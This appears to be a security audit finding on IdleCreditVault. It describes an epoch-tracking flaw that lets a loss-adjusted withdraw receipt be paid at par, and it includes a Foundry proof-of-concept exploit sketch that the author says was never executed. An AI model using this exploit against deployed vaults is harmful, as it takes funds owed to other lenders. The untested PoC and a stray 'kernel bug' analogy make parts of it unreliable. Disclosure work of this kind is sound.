### Title
Loss-adjusted withdraw receipt is misclassified as a fully funded receipt when a second request overwrites `lastWithdrawRequest` - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
The kernel bug is type/identity confusion: a handler assumes a referenced entity has the expected type/binding without verifying it. The analog in `IdleCreditVault` is epoch confusion: `_claimLossAdjustedWithdrawRequest` assumes a user's only unclaimed loss-bearing receipt belongs to the epoch stored in `lastWithdrawRequest[_user]`. `requestWithdraw` unconditionally overwrites `lastWithdrawRequest[_user]` with the *latest* request epoch, so a receipt that was haircut in an earlier `stopEpochWithDuration` loss epoch loses its `lossRecoveryPriceByEpoch` lookup and is later paid at par through `_claimFundedWithdrawRequest`.

### Finding Description
- `requestWithdraw` mints the user a strategy-token receipt and sets `lastWithdrawRequest[_user] = currentEpoch` (line 282), and explicitly supports stacking: "if a user does not claim a withdraw request and instead requests another withdraw, he will have to wait for another epoch to claim both requests" (line 323).
- When the borrower underfunds a stop, `collectWithdrawFunds` sets `pendingWithdraws = 0` and stores `lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice` (lines 411–421). Only `lossRecoveryPrice * basis / RECOVERY_FULL` underlying is actually pulled into the strategy.
- On claim, `claimWithdrawRequest` first calls `_claimLossAdjustedWithdrawRequest`, which reads `lossEpoch = lastWithdrawRequest[_user]` — the *most recent* request epoch — and returns 0 if `lossRecoveryPriceByEpoch[lossEpoch] == 0` (lines 789–795). It never iterates the user's older entries in `withdrawsRequestsByEpoch`.
- It then calls `_claimFundedWithdrawRequest`, which pays out the *aggregate* `withdrawsRequests[_user]` at par via `_transferFundedClaim` (lines 338–349), burning the receipt tokens.
- Sequence: user requests in epoch N → `stopEpochWithDuration` applies loss (price p < 1, only p·basis_N funded) → user does not claim and requests again in epoch N+1 (line 282 overwrites the marker) → epoch N+1 is fully funded → claim: `lossRecoveryPriceByEpoch[N+1] == 0` so the loss path is skipped, and `_claimFundedWithdrawRequest` pays `basis_N + basis_{N+1}` in full even though the strategy only received `p·basis_N + basis_{N+1}`.
- No guard stops this: `_checkTranche`, allow-flags, KYC and the `epochNumber <= lastWithdrawRequest` gate all pass legitimately; there is no check that a prior `withdrawsRequestsByEpoch` entry belongs to a loss epoch before paying the aggregate at par.

### Impact Explanation
Direct theft / insolvency: the attacker is paid `basis_N * (1 - p)` more than was funded for their epoch-N receipt. That underlying was earmarked for other funded claimants and the recovery/funding reserve, so each such claim drains up to the full haircut amount of the earlier loss epoch, leaving later legitimate `claimWithdrawRequest` / `claimInstantWithdrawRequest` calls undercollateralized. Cost to the attacker is only the capital temporarily parked in two withdraw receipts; any KYC-passing lender can do it in the normal (non-default) flow.

### Likelihood Explanation
Requires an epoch stopped with `stopEpochWithDuration(_lossAmount > 0)` — i.e., a partial borrower shortfall — followed by a normal funded epoch. The attacker only needs to hold tranche tokens, request twice across the loss boundary, and claim once. No privileged cooperation, timing race, or external oracle is needed; the misclassification is deterministic from the single-slot `lastWithdrawRequest` bookkeeping.

### Recommendation
Track loss-adjusted claims per epoch rather than deriving the loss epoch from `lastWithdrawRequest`. Concretely: in `_claimLossAdjustedWithdrawRequest`, iterate or record the epoch-N loss price per user (e.g., a `lossEpochByUser`/bitmap or check `withdrawsRequestsByEpoch[_user]` entries against `lossRecoveryPriceByEpoch`), or refuse/queue `requestWithdraw` while the user has an unclaimed receipt in an epoch with a non-zero `lossRecoveryPriceByEpoch`, mirroring the existing post-default "claim prior receipt first" guard.

### Proof of Concept
Foundry fork PoC (sketch, based on `test/foundry/IdleCreditVault.t.sol` helpers):

```solidity
function testLossReceiptPaidAtParAfterSecondRequest() external {
  uint256 amount = 10_000 * ONE_SCALE;
  address attacker = makeAddr("attacker");
  address victim   = makeAddr("victim");

  _depositWithUser(attacker, amount, true);
  _depositWithUser(victim,   amount, true);

  // Epoch N: attacker requests, borrower underfunds -> loss-adjusted price p < 1
  vm.prank(attacker);
  uint256 basisN = cdoEpoch.requestWithdraw(0, address(AAtranche));
  _startEpochAndCheckPrices(0);

  uint256 pendingToFund; uint256 lossAmount;
  {
    uint256 loss = basisN * 30 / 100; // 30% loss on pending basis share
    (pendingToFund,) = IdleCreditVault(address(strategy)).previewLossAdjustedWithdrawFunds(loss);
    lossAmount = loss;
    deal(defaultUnderlying, borrower, cdoEpoch.expectedEpochInterest() + pendingToFund);
    vm.prank(borrower);
    underlying.approve(address(cdoEpoch), type(uint256).max);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(initialProvidedApr, 0, cdoEpoch.epochDuration(), lossAmount);
  }
  uint256 p = IdleCreditVault(address(strategy)).lossRecoveryPriceByEpoch(
      IdleCreditVault(address(strategy)).lastWithdrawRequest(attacker));
  assertGt(p, 0); assertLt(p, ONE_TRANCHE);

  // Epoch N+1: attacker requests again BEFORE claiming -> lastWithdrawRequest overwritten
  _depositWithUser(attacker, amount, true); // fresh tranche position
  vm.prank(attacker);
  uint256 basisN1 = cdoEpoch.requestWithdraw(0, address(AAtranche));
  _startEpochAndCheckPrices(1);
  _stopEpochAndCheckPrices(1, initialProvidedApr, _expectedFundsEndEpoch()); // fully funded

  // Claim: loss path sees lossRecoveryPriceByEpoch[N+1] == 0, funded path pays aggregate at par
  uint256 balPre = underlying.balanceOf(attacker);
  vm.prank(attacker);
  cdoEpoch.claimWithdrawRequest();
  uint256 paid = underlying.balanceOf(attacker) - balPre;

  // Funded for epoch N was only p * basisN; attacker extracts basisN at par
  assertApproxEqAbs(paid, basisN + basisN1, 10, "epoch-N loss receipt paid at par");
  // strategy is now short by basisN * (1 - p) against remaining claimants
}
```

Note: I could not fully execute this within available iterations; the key unchecked assumption to verify in the PoC is that `requestWithdraw` does not revert while a loss-adjusted receipt is unclaimed — the code comments and `_claimFundedWithdrawRequest`'s aggregate payout strongly indicate it is allowed in the non-default path.
